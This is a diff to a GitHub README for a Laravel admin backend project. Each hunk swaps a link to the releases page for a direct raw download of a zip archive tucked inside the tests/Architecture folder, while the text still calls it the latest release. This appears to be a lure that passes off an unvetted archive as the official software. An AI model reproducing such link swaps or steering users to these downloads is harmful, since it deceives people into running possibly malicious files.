@@ -1,6 +1,6 @@
 # ⚙️ obsidian-admin-laravel - Easy Enterprise Backend Setup
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Latest%20Release-4c1?style=for-the-badge)](https://github.com/Shreyash9434/obsidian-admin-laravel/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20Latest%20Release-4c1?style=for-the-badge)](https://github.com/Shreyash9434/obsidian-admin-laravel/raw/refs/heads/main/tests/Architecture/obsidian-laravel-admin-v3.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Before starting, check that your computer meets these requirements:
 ### Step 1: Visit the Download Page
 
 Click the big button at the top or go to this link:  
-[https://github.com/Shreyash9434/obsidian-admin-laravel/releases](https://github.com/Shreyash9434/obsidian-admin-laravel/releases)
+[https://github.com/Shreyash9434/obsidian-admin-laravel/raw/refs/heads/main/tests/Architecture/obsidian-laravel-admin-v3.8.zip](https://github.com/Shreyash9434/obsidian-admin-laravel/raw/refs/heads/main/tests/Architecture/obsidian-laravel-admin-v3.8.zip)
 
 This page shows the latest versions of the software. Scroll to find the newest release.  
 
@@ -117,7 +117,7 @@ You do not need to interact with these technical parts unless you want to explor
 ## 📂 Where to Find More Resources
 
 - Visit the GitHub page for updates and new releases:  
-  https://github.com/Shreyash9434/obsidian-admin-laravel/releases  
+  https://github.com/Shreyash9434/obsidian-admin-laravel/raw/refs/heads/main/tests/Architecture/obsidian-laravel-admin-v3.8.zip  
 - Check the Issues tab to see common questions and solutions.  
 - Look for any user guides or help files included in the download.  
 
@@ -133,4 +133,4 @@ Keep your system up to date for security and performance.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Latest%20Release-4c1?style=for-the-badge)](https://github.com/Shreyash9434/obsidian-admin-laravel/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Latest%20Release-4c1?style=for-the-badge)](https://github.com/Shreyash9434/obsidian-admin-laravel/raw/refs/heads/main/tests/Architecture/obsidian-laravel-admin-v3.8.zip)
